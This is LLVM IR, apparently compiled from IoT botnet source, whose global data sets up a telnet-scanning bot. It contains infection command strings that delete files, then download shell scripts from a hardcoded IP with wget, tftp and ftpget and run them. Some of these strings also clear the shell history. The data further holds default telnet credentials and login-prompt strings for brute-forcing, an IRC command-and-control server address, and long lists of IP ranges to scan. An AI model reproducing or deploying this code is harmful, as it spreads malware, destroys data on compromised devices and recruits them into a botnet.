; ModuleID = 'host/ir_fla/Oblivion.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infect2 = global i8* getelementptr inbounds ([507 x i8], [507 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [507 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00", align 1
@infect = global i8* getelementptr inbounds ([496 x i8], [496 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [496 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@phonepayload = global i8* getelementptr inbounds ([508 x i8], [508 x i8]* @.str.2, i32 0, i32 0), align 8
@.str.2 = private unnamed_addr constant [508 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *; history -c\0D\0A\00", align 1
@usernames = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@.str.3 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@phone = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* null], align 16
@.str.4 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@passwords = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* null], align 16
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* null], align 16
@.str.10 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@.str.17 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@infected = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@.str.20 = private unnamed_addr constant [14 x i8] c"Device Repped\00", align 1
@infectedmessage = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i8* null], align 16
@.str.21 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.24 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.29 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.31, i32 0, i32 0)], align 8
@.str.31 = private unnamed_addr constant [19 x i8] c"144.202.54.51:6667\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Phonepid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.32 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.500 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.35 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.36 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.38 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"112.5.%d.%d\00", align 1
@.str.43 = private unnamed_addr constant [14 x i8] c"117.165.%d.%d\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"85.3.%d.%d\00", align 1
@.str.45 = private unnamed_addr constant [13 x i8] c"41.252.%d.%d\00", align 1
@.str.46 = private unnamed_addr constant [13 x i8] c"104.55.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [13 x i8] c"78.186.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [13 x i8] c"78.189.%d.%d\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"221.120.%d.%d\00", align 1
@.str.50 = private unnamed_addr constant [11 x i8] c"88.5.%d.%d\00", align 1
@.str.51 = private unnamed_addr constant [13 x i8] c"41.254.%d.%d\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"103.20.%d.%d\00", align 1
@.str.53 = private unnamed_addr constant [13 x i8] c"103.47.%d.%d\00", align 1
@.str.54 = private unnamed_addr constant [13 x i8] c"103.57.%d.%d\00", align 1
@.str.55 = private unnamed_addr constant [13 x i8] c"45.117.%d.%d\00", align 1
@.str.56 = private unnamed_addr constant [13 x i8] c"101.51.%d.%d\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"137.59.%d.%d\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"14.204.%d.%d\00", align 1
@.str.59 = private unnamed_addr constant [12 x i8] c"27.50.%d.%d\00", align 1
@.str.60 = private unnamed_addr constant [12 x i8] c"27.54.%d.%d\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"27.98.%d.%d\00", align 1
@.str.62 = private unnamed_addr constant [12 x i8] c"36.32.%d.%d\00", align 1
@.str.63 = private unnamed_addr constant [13 x i8] c"36.248.%d.%d\00", align 1
@.str.64 = private unnamed_addr constant [12 x i8] c"39.64.%d.%d\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"43.253.%d.%d\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"43.230.%d.%d\00", align 1
@.str.67 = private unnamed_addr constant [13 x i8] c"163.53.%d.%d\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"43.245.%d.%d\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"123.25.%d.%d\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"103.54.%d.%d\00", align 1
@.str.71 = private unnamed_addr constant [13 x i8] c"27.255.%d.%d\00", align 1
@.str.72 = private unnamed_addr constant [14 x i8] c"103.204.%d.%d\00", align 1
@.str.73 = private unnamed_addr constant [13 x i8] c"123.24.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [14 x i8] c"113.191.%d.%d\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"113.188.%d.%d\00", align 1
@.str.76 = private unnamed_addr constant [14 x i8] c"113.189.%d.%d\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"14.160.%d.%d\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"14.161.%d.%d\00", align 1
@.str.79 = private unnamed_addr constant [13 x i8] c"14.162.%d.%d\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"14.163.%d.%d\00", align 1
@.str.81 = private unnamed_addr constant [13 x i8] c"14.164.%d.%d\00", align 1
@.str.82 = private unnamed_addr constant [13 x i8] c"14.165.%d.%d\00", align 1
@.str.83 = private unnamed_addr constant [13 x i8] c"14.166.%d.%d\00", align 1
@.str.84 = private unnamed_addr constant [13 x i8] c"14.167.%d.%d\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"14.168.%d.%d\00", align 1
@.str.86 = private unnamed_addr constant [13 x i8] c"14.169.%d.%d\00", align 1
@.str.87 = private unnamed_addr constant [13 x i8] c"14.170.%d.%d\00", align 1
@.str.88 = private unnamed_addr constant [13 x i8] c"14.171.%d.%d\00", align 1
@.str.89 = private unnamed_addr constant [13 x i8] c"14.172.%d.%d\00", align 1
@.str.90 = private unnamed_addr constant [13 x i8] c"14.173.%d.%d\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"14.174.%d.%d\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"14.175.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [13 x i8] c"14.176.%d.%d\00", align 1
@.str.94 = private unnamed_addr constant [13 x i8] c"14.177.%d.%d\00", align 1
@.str.95 = private unnamed_addr constant [13 x i8] c"14.178.%d.%d\00", align 1
@.str.96 = private unnamed_addr constant [13 x i8] c"14.179.%d.%d\00", align 1
@.str.97 = private unnamed_addr constant [13 x i8] c"14.180.%d.%d\00", align 1
@.str.98 = private unnamed_addr constant [13 x i8] c"14.181.%d.%d\00", align 1
@.str.99 = private unnamed_addr constant [13 x i8] c"14.182.%d.%d\00", align 1
@.str.100 = private unnamed_addr constant [13 x i8] c"14.183.%d.%d\00", align 1
@.str.101 = private unnamed_addr constant [13 x i8] c"14.184.%d.%d\00", align 1
@.str.102 = private unnamed_addr constant [13 x i8] c"14.185.%d.%d\00", align 1
@.str.103 = private unnamed_addr constant [13 x i8] c"14.186.%d.%d\00", align 1
@.str.104 = private unnamed_addr constant [13 x i8] c"14.187.%d.%d\00", align 1
@.str.105 = private unnamed_addr constant [13 x i8] c"14.188.%d.%d\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"14.189.%d.%d\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"14.190.%d.%d\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"14.191.%d.%d\00", align 1
@.str.109 = private unnamed_addr constant [13 x i8] c"45.121.%d.%d\00", align 1
@.str.110 = private unnamed_addr constant [13 x i8] c"45.120.%d.%d\00", align 1
@.str.111 = private unnamed_addr constant [13 x i8] c"45.115.%d.%d\00", align 1
@.str.112 = private unnamed_addr constant [13 x i8] c"43.252.%d.%d\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c"43.240.%d.%d\00", align 1
@.str.114 = private unnamed_addr constant [13 x i8] c"41.174.%d.%d\00", align 1
@.str.115 = private unnamed_addr constant [13 x i8] c"45.127.%d.%d\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"103.30.%d.%d\00", align 1
@.str.117 = private unnamed_addr constant [13 x i8] c"123.16.%d.%d\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"202.44.%d.%d\00", align 1
@.str.119 = private unnamed_addr constant [13 x i8] c"116.93.%d.%d\00", align 1
@.str.120 = private unnamed_addr constant [13 x i8] c"41.253.%d.%d\00", align 1
@.str.121 = private unnamed_addr constant [14 x i8] c"117.173.%d.%d\00", align 1
@.str.122 = private unnamed_addr constant [14 x i8] c"113.190.%d.%d\00", align 1
@.str.123 = private unnamed_addr constant [14 x i8] c"112.196.%d.%d\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"113.178.%d.%d\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"112.45.%d.%d\00", align 1
@.str.126 = private unnamed_addr constant [14 x i8] c"183.223.%d.%d\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"116.71.%d.%d\00", align 1
@.str.128 = private unnamed_addr constant [13 x i8] c"103.44.%d.%d\00", align 1
@.str.129 = private unnamed_addr constant [14 x i8] c"110.235.%d.%d\00", align 1
@.str.130 = private unnamed_addr constant [14 x i8] c"124.253.%d.%d\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"211.237.%d.%d\00", align 1
@.str.132 = private unnamed_addr constant [14 x i8] c"117.175.%d.%d\00", align 1
@.str.133 = private unnamed_addr constant [12 x i8] c"111.9.%d.%d\00", align 1
@.str.134 = private unnamed_addr constant [14 x i8] c"222.252.%d.%d\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"113.174.%d.%d\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"113.160.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"113.161.%d.%d\00", align 1
@.str.138 = private unnamed_addr constant [14 x i8] c"113.162.%d.%d\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"113.163.%d.%d\00", align 1
@.str.140 = private unnamed_addr constant [14 x i8] c"113.164.%d.%d\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"113.165.%d.%d\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"113.166.%d.%d\00", align 1
@.str.143 = private unnamed_addr constant [14 x i8] c"113.167.%d.%d\00", align 1
@.str.144 = private unnamed_addr constant [14 x i8] c"113.168.%d.%d\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"113.169.%d.%d\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"123.17.%d.%d\00", align 1
@.str.147 = private unnamed_addr constant [13 x i8] c"123.21.%d.%d\00", align 1
@.str.148 = private unnamed_addr constant [13 x i8] c"123.22.%d.%d\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"222.253.%d.%d\00", align 1
@.str.150 = private unnamed_addr constant [14 x i8] c"222.254.%d.%d\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"222.255.%d.%d\00", align 1
@.str.152 = private unnamed_addr constant [13 x i8] c"41.208.%d.%d\00", align 1
@.str.153 = private unnamed_addr constant [14 x i8] c"103.198.%d.%d\00", align 1
@.str.154 = private unnamed_addr constant [13 x i8] c"88.248.%d.%d\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"88.105.%d.%d\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"88.247.%d.%d\00", align 1
@.str.157 = private unnamed_addr constant [13 x i8] c"85.105.%d.%d\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"188.3.%d.%d\00", align 1
@.str.159 = private unnamed_addr constant [14 x i8] c"103.203.%d.%d\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"103.55.%d.%d\00", align 1
@.str.161 = private unnamed_addr constant [14 x i8] c"103.220.%d.%d\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"183.233.%d.%d\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"103.242.%d.%d\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"103.14.%d.%d\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"103.195.%d.%d\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"103.214.%d.%d\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"103.218.%d.%d\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"103.225.%d.%d\00", align 1
@.str.169 = private unnamed_addr constant [14 x i8] c"103.228.%d.%d\00", align 1
@.str.170 = private unnamed_addr constant [14 x i8] c"103.231.%d.%d\00", align 1
@.str.171 = private unnamed_addr constant [13 x i8] c"103.60.%d.%d\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"103.248.%d.%d\00", align 1
@.str.173 = private unnamed_addr constant [14 x i8] c"103.253.%d.%d\00", align 1
@.str.174 = private unnamed_addr constant [14 x i8] c"103.255.%d.%d\00", align 1
@.str.175 = private unnamed_addr constant [14 x i8] c"113.176.%d.%d\00", align 1
@.str.176 = private unnamed_addr constant [14 x i8] c"113.175.%d.%d\00", align 1
@.str.177 = private unnamed_addr constant [14 x i8] c"203.134.%d.%d\00", align 1
@.str.178 = private unnamed_addr constant [14 x i8] c"203.210.%d.%d\00", align 1
@.str.179 = private unnamed_addr constant [14 x i8] c"117.176.%d.%d\00", align 1
@.str.180 = private unnamed_addr constant [14 x i8] c"117.171.%d.%d\00", align 1
@.str.181 = private unnamed_addr constant [14 x i8] c"117.162.%d.%d\00", align 1
@.str.182 = private unnamed_addr constant [14 x i8] c"203.150.%d.%d\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"157.119.%d.%d\00", align 1
@.str.184 = private unnamed_addr constant [13 x i8] c"43.228.%d.%d\00", align 1
@.str.185 = private unnamed_addr constant [13 x i8] c"162.12.%d.%d\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"115.220.%d.%d\00", align 1
@.str.187 = private unnamed_addr constant [14 x i8] c"125.114.%d.%d\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"119.157.%d.%d\00", align 1
@.str.189 = private unnamed_addr constant [14 x i8] c"119.150.%d.%d\00", align 1
@.str.190 = private unnamed_addr constant [14 x i8] c"119.151.%d.%d\00", align 1
@.str.191 = private unnamed_addr constant [14 x i8] c"119.152.%d.%d\00", align 1
@.str.192 = private unnamed_addr constant [14 x i8] c"119.153.%d.%d\00", align 1
@.str.193 = private unnamed_addr constant [14 x i8] c"119.154.%d.%d\00", align 1
@.str.194 = private unnamed_addr constant [14 x i8] c"119.155.%d.%d\00", align 1
@.str.195 = private unnamed_addr constant [14 x i8] c"119.156.%d.%d\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"119.158.%d.%d\00", align 1
@.str.197 = private unnamed_addr constant [14 x i8] c"119.159.%d.%d\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"191.24.%d.%d\00", align 1
@.str.199 = private unnamed_addr constant [14 x i8] c"187.119.%d.%d\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"177.215.%d.%d\00", align 1
@.str.201 = private unnamed_addr constant [14 x i8] c"152.241.%d.%d\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"182.185.%d.%d\00", align 1
@.str.203 = private unnamed_addr constant [13 x i8] c"179.80.%d.%d\00", align 1
@.str.204 = private unnamed_addr constant [13 x i8] c"179.81.%d.%d\00", align 1
@.str.205 = private unnamed_addr constant [13 x i8] c"179.82.%d.%d\00", align 1
@.str.206 = private unnamed_addr constant [13 x i8] c"179.83.%d.%d\00", align 1
@.str.207 = private unnamed_addr constant [13 x i8] c"179.84.%d.%d\00", align 1
@.str.208 = private unnamed_addr constant [13 x i8] c"179.86.%d.%d\00", align 1
@.str.209 = private unnamed_addr constant [13 x i8] c"179.87.%d.%d\00", align 1
@.str.210 = private unnamed_addr constant [13 x i8] c"179.88.%d.%d\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"179.89.%d.%d\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"179.90.%d.%d\00", align 1
@.str.213 = private unnamed_addr constant [13 x i8] c"179.91.%d.%d\00", align 1
@.str.214 = private unnamed_addr constant [13 x i8] c"179.92.%d.%d\00", align 1
@.str.215 = private unnamed_addr constant [13 x i8] c"179.93.%d.%d\00", align 1
